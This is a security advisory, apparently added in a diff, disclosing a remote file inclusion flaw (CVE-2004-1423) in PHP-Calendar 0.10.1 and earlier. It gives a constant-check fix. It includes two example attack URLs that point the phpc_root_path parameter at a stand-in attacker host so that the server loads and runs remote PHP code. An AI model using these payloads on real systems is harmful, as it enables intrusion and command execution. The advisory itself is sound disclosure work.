@@ -1,0 +1,36 @@
+PHP-Calendar Arbitrary File Inclusion
+
+Vendor: Sean Proctor
+Product: PHP-Calendar
+Version: <= 0.10.1
+Website: http://php-calendar.sourceforge.net/
+
+BID: 12127 
+CVE: CVE-2004-1423 
+OSVDB: 12700 12701 
+SECUNIA: 22516 
+PACKETSTORM: 35563 
+
+Description:
+I was searching for a decent calendar which my group at school could use to keep track of events, etc. We were previously using localendar, which I didn't like and it had some problems. I found CST-Calendar which did most of what I wanted, but was rather ugly and missed some features others in the group wanted. So, I gradually re-wrote CST-Calendar since that project seems to have stopped work entirely. [ As quoted from their website ] 
+
+
+File Include Vulnerability:
+There is a very dangerous file include vulnerability in php-calendar, and making the issue even more dangerous is that I found out about php-calendar from an individual who said that php-calendar is a great open source calendar to use in php projects, and is fairly popular amongst open source php developers. This may be true, but the vulnerabilities need to be fixed if the same conditions apply as found in the original code. Below are example attack url's 
+
+http://path/includes/calendar.php?phpc_root_path=http://attacker/includes/html.php http://path/includes/setup.php?phpc_root_path=http://attacker/includes/html.php 
+
+If php globals are set to on then it is highly probable that an attacker will be able to include arbitrary php files and thus execute system commands with the rights of the web server. This can be very dangerous in some situations. 
+
+
+Solution:
+php-calendar has a defined constant to help prevent against stuff like this. It can be seen in other php-calendar files such as db.php 
+if ( !defined('IN_PHPC') ) {
+	die("Hacking attempt");
+}
+
+Adding the following to the top of the affected pages should suffice in preventing the kinds of attacks previously mentioned in this advisory. 
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
